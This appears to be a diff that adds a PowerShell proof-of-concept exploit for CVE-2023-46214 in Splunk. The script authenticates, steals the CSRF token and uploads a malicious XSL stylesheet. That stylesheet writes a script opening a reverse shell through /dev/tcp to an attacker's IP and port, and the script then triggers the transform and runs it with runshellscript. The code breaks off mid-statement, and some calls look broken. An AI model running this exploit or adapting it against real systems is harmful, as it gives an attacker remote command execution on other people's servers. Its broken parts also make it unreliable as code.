@@ -1,0 +1,215 @@
+param (
+    [string]$Url,
+    [string]$Username,
+    [string]$Password,
+    [string]$Ip,
+    [string]$Port
+)
+
+# Generate malicious XSL
+function Generate-MaliciousXsl {
+    param (
+        [string]$Ip,
+        [string]$Port
+    )
+    return @"
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
+  <xsl:template match="/">
+    <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
+        <xsl:text>sh -i &gt;&amp; /dev/tcp/$Ip/$Port 0&gt;&amp;1</xsl:text>
+    </exsl:document>
+  </xsl:template>
+</xsl:stylesheet>
+"@
+}
+
+# Login function
+function Login {
+    param (
+        [System.Net.Http.HttpClient]$Client,
+        [string]$Url,
+        [string]$Username,
+        [string]$Password
+    )
+    
+    $loginUrl = "$Url/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
+    $response = $Client.GetAsync($loginUrl).Result
+    $cval = $Client.DefaultRequestHeaders.Cookie.GetCookies($loginUrl)["cval"].Value
+
+    if (-not $cval) {
+        return $false
+    }
+
+    $authPayload = @{
+        "cval" = $cval
+        "username" = $Username
+        "password" = $Password
+        "set_has_logged_in" = "false"
+    }
+
+    $authUrl = "$Url/en-US/account/login"
+    $response = $Client.PostAsync($authUrl, [System.Net.Http.FormUrlEncodedContent]::new($authPayload)).Result
+    return $response.StatusCode -eq [System.Net.Http.HttpStatusCode]::OK
+}
+
+# Get CSRF token
+function Get-Cookie {
+    param (
+        [System.Net.Http.HttpClient]$Client,
+        [string]$Url
+    )
+    $response = $Client.GetAsync($Url).Result
+    return $response.StatusCode -eq [System.Net.Http.HttpStatusCode]::OK
+}
+
+# Upload file
+function Upload-File {
+    param (
+        [System.Net.Http.HttpClient]$Client,
+        [string]$Url,
+        [string]$FileContent,
+        [string]$CsrfToken
+    )
+
+    $content = [System.Net.Http.MultipartFormDataContent]::new()
+    $fileContent = [System.Net.Http.StringContent]::new($FileContent, [System.Text.Encoding]::UTF8, "application/xslt+xml")
+    $content.Add($fileContent, "spl-file", "shell.xsl")
+
+    $uploadHeaders = @{
+        "User-Agent" = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
+        "Accept" = "text/javascript, text/html, application/xml, text/xml, */*"
+        "X-Requested-With" = "XMLHttpRequest"
+        "X-Splunk-Form-Key" = $CsrfToken
+    }
+
+    $uploadUrl = "$Url/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl"
+    $response = $Client.PostAsync($uploadUrl, $content).Result
+
+    $responseBody = $response.Content.ReadAsStringAsync().Result
+    $jsonResponse = $responseBody | ConvertFrom-Json
+
+    if ($jsonResponse.messages[0].text -like "*concatenate*") {
+        return $false, $null
+    }
+    return $true, $jsonResponse.messages[0].text
+}
+
+# Get Job Search ID
+function Get-JobSearchId {
+    param (
+        [System.Net.Http.HttpClient]$Client,
+        [string]$Url,
+        [string]$Username,
+        [string]$CsrfToken
+    )
+
+    $jsidData = @{
+        "search" = "|search test|head 1"
+    }
+
+    $jsidUrl = "$Url/en-US/splunkd/__raw/servicesNS/$Username/search/search/jobs?output_mode=json"
+    $uploadHeaders = @{
+        "User-Agent" = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
+        "X-Requested-With" = "XMLHttpRequest"
+        "X-Splunk-Form-Key" = $CsrfToken
+    }
+
+    $response = $Client.PostAsync($jsidUrl, [System.Net.Http.FormUrlEncodedContent]::new($jsidData)).Result
+    $responseBody = $response.Content.ReadAsStringAsync().Result
+
+    try {
+        $jsonResponse = $responseBody | ConvertFrom-Json
+        return $true, $jsonResponse.sid
+    }
+    catch {
+        return $false, $null
+    }
+}
+
+# Trigger XSLT Transform
+function Trigger-XsltTransform {
+    param (
+        [System.Net.Http.HttpClient]$Client,
+        [string]$Url,
+        [string]$Jsid,
+        [string]$TextValue
+    )
+
+    $xsltHeaders = @{
+        "User-Agent" = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
+        "X-Splunk-Module" = "Splunk.Module.DispatchingModule"
+        "Connection" = "close"
+        "Upgrade-Insecure-Requests" = "1"
+        "Accept-Language" = "en-US,en;q=0.5"
+        "Accept-Encoding" = "gzip, deflate"
+        "X-Requested-With" = "XMLHttpRequest"
+    }
+
+    $exploitEndpoint = "$Url/en-US/api/search/jobs/$Jsid/results?xsl=/opt/splunk/var/run/splunk/dispatch/$TextValue/shell.xsl"
+    $response = $Client.GetAsync($exploitEndpoint).Result
+    $response = $Client.GetAsync($exploitEndpoint, [System.Net.Http.HttpRequestMessage]::new("GET", $exploitEndpoint)).Result
+    return $response.StatusCode -eq [System.Net.Http.HttpStatusCode]::OK
+}
+
+# Trigger Reverse Shell
+function Trigger-ReverseShell {
+    param (
+        [System.Net.Http.HttpClient]$Client,
+        [string]$Url,
+        [string]$Username,
+        [string]$Jsid,
+        [string]$CsrfToken
+    )
+
+    $runshellscriptData = @{
+        "search" = "|runshellscript \"shell.sh\" \"\" \"\" \"\" \"\" \"\" \"\" \"$Jsid\""
+    }
+
+    $runshellscriptUrl = "$Url/en-US/splunkd/__raw/servicesNS/$Username/search/search/jobs"
+    $uploadHeaders = @{
+        "User-Agent" = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
+        "X-Requested-With" = "XMLHttpRequest"
+        "X-Splunk-Form-Key" = $CsrfToken
+    }
+
+    $response = $Client.PostAsync($runshellscriptUrl, [System.Net.Http.FormUrlEncodedContent]::new($runshellscriptData)).Result
+    return $response.StatusCode -eq [System.Net.Http.HttpStatusCode]::Created
+}
+
+# Main script
+function Main {
+    $client = [System.Net.Http.HttpClient]::new()
+
+    Write-Output "[!] CVE: CVE-2023-46214"
+    Write-Output "[!] Github: https://github.com/nathan31337/Splunk-RCE-poc"
+
+    if (-not (Login -Client $client -Url $Url -Username $Username -Password $Password)) {
+        Write-Output "[-] Authentication failed"
+        exit
+    }
+
+    Write-Output "[+] Authentication successful"
+
+    Write-Output "[*] Grabbing CSRF token" -NoNewline
+    if (-not (Get-Cookie -Client $client -Url "$Url/en-US")) {
+        Write-Output "[-] Failed to obtain CSRF token"
+        exit
+    }
+
+    Write-Output "[+] CSRF token obtained"
+
+    $csrfToken = $client.DefaultRequestHeaders.Cookie.GetCookies("$Url/en-US")["splunkweb_csrf_token_8000"].Value
+
+    $maliciousXsl = Generate-MaliciousXsl -Ip $Ip -Port $Port
+    $uploaded, $textValue = Upload-File -Client $client -Url $Url -FileContent $maliciousXsl -CsrfToken $csrfToken
+
+    if (-not $uploaded) {
+        Write-Output "[-] File upload failed"
+        exit
+    }
+
+    Write-Output "[+] Malicious XSL file uploaded successfully"
+
+    $jsidCreated, $jsid = Get
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
